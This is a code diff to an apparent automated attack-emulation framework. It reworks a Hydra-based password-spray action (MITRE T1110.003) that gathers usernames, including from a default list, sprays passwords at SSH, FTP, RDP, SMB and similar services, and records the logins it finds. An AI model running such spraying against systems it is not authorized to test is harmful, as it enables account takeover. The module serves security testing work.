@@ -10,8 +10,29 @@ from Session import SessionManager
 from motifs import ActionInputMotif, ActionOutputMotif, StateChangeOperation
 
 
+class HydraConfig:
+    """Shared Hydra-related constants and helpers for password-spray (and related) actions."""
+
+    ARTEFACT_SCAN_RESULTS = "scan_results_json"
+    DEFAULT_USERS_FILE = "password_spray_default_users.lst"
+    HYDRA_SUPPORTED_PROTOCOLS = frozenset({
+        "ssh", "ftp", "telnet", "http", "https", "http-get", "http-post",
+        "mysql", "mssql", "postgres", "rdp", "smb", "vnc",
+    })
+    PROTOCOL_ALIASES = {"postgresql": "postgres"}
+    USERS_NON_NULL = "[u IN collect(DISTINCT users) WHERE u IS NOT NULL]"
+
+    @classmethod
+    def acceptable_protocols(cls) -> list:
+        """Protocols the query may match (Hydra-supported + alias keys like postgresql)."""
+        return list(cls.HYDRA_SUPPORTED_PROTOCOLS | set(cls.PROTOCOL_ALIASES.keys()))
+
+
 class PasswordSprayAction(Action):
-    """Password spray via Hydra: one password against known users on a service (SSH, FTP, etc.)."""
+    """Password spray via Hydra: one password against known users on a service (SSH, FTP, etc.).
+    Example use of the hydra action:
+    - hydra -L users.txt -P password.txt -o output.json -b json -t 4 ftp://10.10.10.10
+    """
 
     def __init__(self):
         super().__init__("PasswordSpray", "T1110.003", "TA0006", ["noisy", "fast"])
@@ -98,60 +119,144 @@ class PasswordSprayAction(Action):
 
         return output_motif
 
+    @staticmethod
+    def _cred_list_from_pattern_creds(pattern_creds) -> list:
+        """Return list of credential entities (handles 'entities' list or single entity)."""
+        if not pattern_creds:
+            return []
+        return pattern_creds.get("entities") or [pattern_creds]
+
+    @staticmethod
+    def _passwords_from_creds(creds_ent) -> list[str]:
+        """Return non-empty password strings from credentials (single entity or entities list)."""
+        if not creds_ent or not getattr(creds_ent, "get", None):
+            return []
+        entities = creds_ent.get("entities")
+        if entities:
+            return [
+                p for e in entities
+                if getattr(e, "get", None) and (p := e.get("password")) and str(p).strip()
+            ]
+        pwd = creds_ent.get("password")
+        return [pwd] if pwd and str(pwd).strip() else []
+
     def expected_outcome(self, pattern: Pattern) -> list[str]:
         """
         Return expected outcome of action.
         """
         users_ent = pattern.get("users")
-        count = len(users_ent.get("entities")) if users_ent and users_ent.get("entities") else 0
+        user_list = (users_ent.get("entities") or []) if getattr(users_ent, "get", None) else []
+        count = len(user_list)
+
+        passwords = self._passwords_from_creds(pattern.get("credentials"))
+        if len(passwords) > 1:
+            pwd_desc = f"{len(passwords)} password(s)"
+        elif len(passwords) == 1:
+            pwd_desc = f"'{passwords[0]}'"
+        else:
+            pwd_desc = "?"
+
+        service = pattern.get("service")
+        asset = pattern.get("asset")
+        protocol = service.get("protocol") if getattr(service, "get", None) else "?"
+        svc_id = getattr(service, "_id", "?") if service else "?"
+        ip = asset.get("ip_address") if getattr(asset, "get", None) else "?"
+
         return [
-            f"Try password '{pattern.get('credentials').get('password')}' against {count} user(s) "
-            f"on {pattern.get('service').get('protocol')} service ({pattern.get('service')._id}) "
-            f"on {pattern.get('asset').get('ip_address')}"
+            f"Try {pwd_desc} against {count} user(s) "
+            f"on {protocol} service ({svc_id}) on {ip}"
         ]
 
     def get_target_query(self) -> Query:
-        """Service + User + Credentials (password). One pattern per (service, user, password)."""
-        query = self.input_motif.get_query()
-        service = self.input_motif.get_template('existing_service').entity
-        creds = self.input_motif.get_template('spray_password').entity
-        usr = self.input_motif.get_template('existing_user').entity
+        """Service + optional User(s) + Credentials (password). When no users in graph, use
+        default user list (password_spray_default_users.lst)."""
+        asset = self.input_motif.get_template("existing_asset").entity
+        port = self.input_motif.get_template("existing_port").entity
+        service = self.input_motif.get_template("existing_service").entity
+        users = self.input_motif.get_template("existing_user").entity
+        creds = self.input_motif.get_template("spray_password").entity
+
+        query = Query()
+        query.match(
+            asset.with_edge(Relationship("has", alias="has", direction="r"))
+            .with_node(port)
+            .with_edge(Relationship("is_running", alias="is_running", direction="r"))
+            .with_node(service)
+        )
+        query.optional_match(users - Relationship("is_client") - service)
+        query.match(creds)
         query.where(service.protocol.is_not_null())
+        query.where(service.protocol.is_in(HydraConfig.acceptable_protocols()))
         query.where(creds.password.is_not_null())
         query.where(creds.password != "")
-        query.where(usr.username.is_not_null())
-        query.where(usr.username != "")
+
+        filtered = HydraConfig.USERS_NON_NULL
         query.carry(
-            "asset, port, service, collect(DISTINCT users) AS users, collect(credentials)[0] AS credentials"
+            "asset, port, service, "
+            f"CASE WHEN size({filtered}) = 0 THEN null ELSE {filtered} END AS users, "
+            "collect(DISTINCT credentials) AS credentials"
         )
         query.ret_all()
         return query
 
-    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
-        """Run Hydra: one password against all users for the service (one run per service)."""
-        service = pattern.get("service")
-        protocol = service.get("protocol")
-        password = pattern.get("credentials").get("password")
-        if not protocol:
-            raise ValueError("Service has no protocol")
+    @staticmethod
+    def _noop_result(reason: str) -> ActionExecutionResult:
+        """Return a no-op execution result with the given reason."""
+        return ActionExecutionResult(
+            command=["noop"],
+            stdout=reason,
+            exit_status=0,
+            artefacts={},
+        )
 
+    def _usernames_from_pattern(
+        self, pattern: Pattern, artefacts: ArtefactManager
+    ) -> list[str]:
+        """Return usernames from pattern (users entities) or default file; excludes anonymous for FTP."""
         users_ent = pattern.get("users")
-        user_list = users_ent.get("entities") if users_ent else []
+        user_list = (users_ent.get("entities") or []) if getattr(users_ent, "get", None) else []
         seen: set[str] = set()
-        usernames = []
-        for user in user_list or []:
-            name = user.get("username") or user.get("name")
+        usernames: list[str] = []
+        for user in user_list:
+            if user is None:
+                continue
+            name = (user.get("username") or user.get("name")) if getattr(user, "get", None) else None
             if name and name != "anonymous" and name not in seen:
                 seen.add(name)
                 usernames.append(name)
 
+        if usernames:
+            return usernames
+        try:
+            in_uuid = artefacts.search(HydraConfig.DEFAULT_USERS_FILE)[0]
+            with open(artefacts.get_path(in_uuid)) as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith("#") and line not in seen:
+                        seen.add(line)
+                        usernames.append(line)
+        except (IndexError, FileNotFoundError):
+            pass
+        return usernames
+
+    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
+        """Run Hydra: one or more passwords against all users for the service. When no users in pattern,
+        use default user list (password_spray_default_users.lst)."""
+        service = pattern.get("service")
+        protocol_from_pattern = service.get("protocol") if getattr(service, "get", None) else None
+        if not protocol_from_pattern:
+            raise ValueError("Service has no protocol")
+        hydra_protocol = HydraConfig.PROTOCOL_ALIASES.get(protocol_from_pattern, protocol_from_pattern)
+        if hydra_protocol not in HydraConfig.HYDRA_SUPPORTED_PROTOCOLS:
+            return self._noop_result(f"Hydra does not support protocol: {protocol_from_pattern}")
+
+        passwords = self._passwords_from_creds(pattern.get("credentials"))
+        if not passwords:
+            return self._noop_result("no credentials with password in pattern; skipping")
+
+        usernames = self._usernames_from_pattern(pattern, artefacts)
         if not usernames:
-            return ActionExecutionResult(
-                command=["noop"],
-                stdout="no valid users in pattern; skipping",
-                exit_status=0,
-                artefacts={},
-            )
+            return self._noop_result("no valid users in pattern or default list; skipping")
 
         users_path = artefacts.get_path(artefacts.placeholder("password_spray_users.lst"))
         pass_path = artefacts.get_path(artefacts.placeholder("password_spray_password.lst"))
@@ -160,18 +265,29 @@ class PasswordSprayAction(Action):
         with open(users_path, "w") as f:
             f.write("\n".join(usernames) + "\n")
         with open(pass_path, "w") as f:
-            f.write(f"{password}\n")
+            f.write("\n".join(passwords) + "\n")
+
+        asset = pattern.get("asset")
+        ip_address = asset.get("ip_address") if asset else None
+        if not ip_address:
+            raise ValueError("Pattern has no asset or asset has no ip_address")
+        port_ent = pattern.get("port")
+        port_num = port_ent.get("number") if port_ent else None
+        target = f"{hydra_protocol}://{ip_address}:{port_num}" if port_num is not None else f"{hydra_protocol}://{ip_address}"
 
         execres = shell(
             "hydra",
-            ["-L", str(users_path), "-P", str(pass_path), "-o", str(out_path), "-b", "json", f"{protocol}://{pattern.get('asset').get('ip_address')}"],
+            ["-L", str(users_path), "-P", str(pass_path), "-o", str(out_path), "-b", "json", target],
         )
-        execres.artefacts["scan_results_json"] = out_uuid
+        execres.artefacts[HydraConfig.ARTEFACT_SCAN_RESULTS] = out_uuid
         return execres
 
     def parse_output(self, output: ActionExecutionResult, artefacts: ArtefactManager) -> dict:
         """Extract successful logins from Hydra JSON output."""
-        with artefacts.open(output.artefacts["scan_results_json"], 'r') as f:
+        key = output.artefacts.get(HydraConfig.ARTEFACT_SCAN_RESULTS)
+        if key is None:
+            raise ValueError(f"ActionExecutionResult missing artefacts[{HydraConfig.ARTEFACT_SCAN_RESULTS!r}]; cannot parse output.")
+        with artefacts.open(key, "r") as f:
             results = json.load(f)
         creds = [
             {"username": r["login"], "password": r["password"]}
@@ -181,26 +297,34 @@ class PasswordSprayAction(Action):
         return {"discovered_credentials": creds}
 
     def populate_output_motif(self, pattern: Pattern, discovered_data: dict) -> StateChangeSequence:
-        """Update/create Credentials (by pattern uuid or service+user), User, Session."""
+        """Update existing Credentials (by service+username), add User and Session.
+        When the input Credentials node has no username (password-only), match by uuid so we can
+        update it with the discovered username once the spray succeeds."""
         self.output_motif.reset_context()
-        service = pattern.get('service')
-        protocol = service.get('protocol')
-        pattern_creds = pattern.get('credentials')
+        service = pattern.get("service")
+        protocol = service.get("protocol")
+        cred_list = self._cred_list_from_pattern_creds(pattern.get("credentials"))
+        single_cred = len(cred_list) == 1 and cred_list[0] and cred_list[0].get("uuid")
+        single_cred_uuid = cred_list[0].get("uuid") if single_cred else None
 
         changes: StateChangeSequence = []
+        updated_single_cred = False
         for cred_data in discovered_data["discovered_credentials"]:
             username = cred_data["username"]
             password = cred_data["password"]
             creds_entity = Entity("Credentials", alias="creds", username=username, password=password)
-            # Update the Credentials node we sprayed with (by uuid) or by (service, username)
             match_creds = (
-                Entity("Credentials", alias="creds", uuid=pattern_creds.get("uuid"))
-                if pattern_creds and pattern_creds.get("uuid")
+                Entity("Credentials", alias="creds", uuid=single_cred_uuid)
+                if single_cred
                 else Entity("Credentials", alias="creds", username=username)
             )
             creds_match = match_creds - Relationship("secured_with") - service
-            changes.append((creds_match, "update", creds_entity))
-            changes.append(self.output_motif.instantiate("discovered_credentials", match_on_override=service, username=username, password=password))
+
+            if not single_cred or not updated_single_cred:
+                changes.append((creds_match, "update", creds_entity))
+                if single_cred:
+                    updated_single_cred = True
+
             changes.append(self.output_motif.instantiate("discovered_user", match_on_override=service, username=username))
             changes.append(self.output_motif.instantiate(
                 "discovered_session",
@@ -213,8 +337,35 @@ class PasswordSprayAction(Action):
             ))
         return changes
 
+    def _normalize_anonymous_ftp_credentials(
+        self, discovered_data: dict, pattern: Pattern
+    ) -> dict:
+        """
+        When the service has anonymous_login=True, Hydra may report (ftp, <any_password>)
+        as valid because vsFTPd accepts any password for the ftp user. Normalize such
+        results to represent anonymous access: username anonymous, password empty.
+        """
+        service = pattern.get("service")
+        if not service or not service.get("anonymous_login"):
+            return discovered_data
+        anonymous_usernames = {"ftp", "anonymous"}
+        normalized = []
+        seen_anonymous = False
+        for cred in discovered_data.get("discovered_credentials", []):
+            username = (cred.get("username") or "").strip().lower()
+            if username in anonymous_usernames:
+                if not seen_anonymous:
+                    normalized.append({"username": "anonymous", "password": ""})
+                    seen_anonymous = True
+            else:
+                normalized.append(cred)
+        discovered_data["discovered_credentials"] = normalized
+        return discovered_data
+
     def capture_state_change(
         self, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
     ) -> StateChangeSequence:
         """Parse Hydra output and apply Credentials/User/Session changes."""
-        return self.populate_output_motif(pattern, self.parse_output(output, artefacts))
+        discovered_data = self.parse_output(output, artefacts)
+        discovered_data = self._normalize_anonymous_ftp_credentials(discovered_data, pattern)
+        return self.populate_output_motif(pattern, discovered_data)
